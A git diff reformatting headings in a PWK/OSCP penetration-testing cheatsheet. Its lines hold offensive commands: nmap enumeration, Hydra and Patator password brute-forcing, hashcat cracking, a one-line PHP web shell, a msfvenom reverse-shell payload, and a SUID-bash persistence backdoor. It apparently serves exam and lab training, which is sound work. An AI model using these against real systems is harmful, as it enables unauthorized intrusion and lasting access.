@@ -1,19 +1,21 @@
-# cyberphor's Pentesting Cheatsheet
+## PWK/OSCP Cheatsheet
+**Author:** Victor Fernandez III  
+**GitHub:** http://github.com/cyberphor  
 
-## Reconnaissance
-### Ports
+### Reconnaissance
+#### Ports
 ```bash
 sudo nmap $TARGET -sS -sU -oN scans/$TARGET-nmap-initial
 sudo nmap $TARGET -sS -sU -p- -oN scans/$TARGET-nmap-complete
 ```
 
-## Enumeration
-### Service Versions
+### Enumeration
+#### Service Versions
 ```bash
 sudo nmap $TARGET -sV -sC $(print-open-ports-from-nmap-scan scans/$NAME-nmap-complete) -oN scans/$NAME-nmap-versions
 ```
 
-### Operating System
+#### Operating System
 ```bash
 sudo nmap $TARGET -O -oN scans/$NAME-nmap-os
 ```
@@ -55,7 +57,7 @@ sudo nmap $TARGET -p25 --script smtp-vuln* -oN scans/mailman-nmap-scripts-smtp-v
 # replace the lines above with the actual scan results
 ```
 
-### HTTP
+#### HTTP
 ```bash
 sudo nmap $TARGET -p80 --script http-shellshock -oN scans/$NAME-nmap-scripts-http-shellshock-80
 ```
@@ -72,19 +74,19 @@ dirsearch -u $TARGET:$PORT -o $FULLPATH/$NAME-dirsearch-80
 nikto -h $TARGET -p $PORT -T 2 -Format txt -o scans/$NAME-nikto-misconfig-80
 ```
 
-### RPC
+#### RPC
 ```bash
 rpcclient -U '' $TARGET
 srvinfo
 netshareenum
 ```
 
-### NetBIOS
+#### NetBIOS
 ```bash
 nbtscan $TARGET
 ```
 
-### SMB
+#### SMB
 The following SMB shares were discovered using Smbclient.
 ```bash
 smbclient -L $TARGET
@@ -114,12 +116,12 @@ The target is NOT vulnerable to SambaCry.
 sudo nmap $TARGET -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -oN scans/$NAME-nmap-scripts-smb-vuln-cve-2017-7494
 ```
 
-### SQL
+#### SQL
 ```bash
 mysql -u $USER -h $TARGET
 ```
 
-### RDP
+#### RDP
 ```bash
 sudo nmap $TARGET -p3389 --script rdp-ntlm-info -oN scans/$NAME-nmap-scripts-rdp-ntlm-info
 ```
@@ -128,15 +130,15 @@ sudo nmap $TARGET -p3389 --script rdp-ntlm-info -oN scans/$NAME-nmap-scripts-rdp
 rdesktop -u administrator $TARGET
 ```
 
-### Postgres
+#### Postgres
 ```bash
 psql -U postgres -p 5437 -h $TARGET # postgres:postgres
 SELECT pg_ls_dir('/');
 ```
 
-## Gaining Access
-### Password Guessing  
-#### Default Credentials
+### Gaining Access
+#### Password Guessing  
+Default Credentials
 ```bash
 # anonymous:anonymous
 # guest:guest
@@ -144,17 +146,17 @@ SELECT pg_ls_dir('/');
 # admin:adminadmin
 ```
 
-#### Hydra
+Hydra
 ```bash
 hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/phpmyadmin/index.php?:pma_username=^USER^&pma_password=^PASS^:Cannot|without"
 ```
 
-#### Patator
+Patator
 ```bash
 patator http_fuzz url=http://$TARGET/$LOGIN method=POST body='username=FILE0&password=FILE1' 0=usernames.txt 1=/usr/share/wordlists/rockyout.txt -x ignore:fgrep=Unauthorized
 ```
 
-#### Hashcat
+Hashcat
 ```hash
 # modes - SHA256: 1400
 # attacks - Dictionary: 0
@@ -162,22 +164,20 @@ hashcat -m $MODE -a $ATTACK /path/to/hashes.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 1400 -a 0 /path/to/hashes.txt /usr/share/wordlists/rockyou.txt 
 ```
 
-### Remote File Inclusion
+#### Remote File Inclusion
 ```bash
 # find a way to upload a PHP command shell
 vim cmd.php
 <?php echo shell_exec($_GET['cmd']); ?>
 ```
 
-### Reverse Shell
+#### Reverse Shell
 ```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=$TARGET LPORT=$PORT -f elf -o rshell.elf
 ```
 
-## Maintaining Access
-
-### Privilege Escalation
-#### Linux
+### Maintaining Access
+#### Linux Privilege Escalation
 ```bash
 whoami
 uname -a
@@ -191,7 +191,7 @@ rpm -qa # red hat
 pacman -Qe # arch linux
 ```
 
-#### Windows
+#### Windows Privilege Escalation
 ```bash
 whoami
 whoami /priv
@@ -205,9 +205,8 @@ wmic service get name,pathname,startname | findstr "Program Files"
 cacls *.exe
 ```
 
-### Persistence
-#### Rootbash
-Credit: Tib3rius
+#### Persistence  
+Rootbash (Credit: Tib3rius)
 ```bash
 # as root, create a copy of BASH and then set the SUID-bit
 # to resume root-access execute the new binary using -p
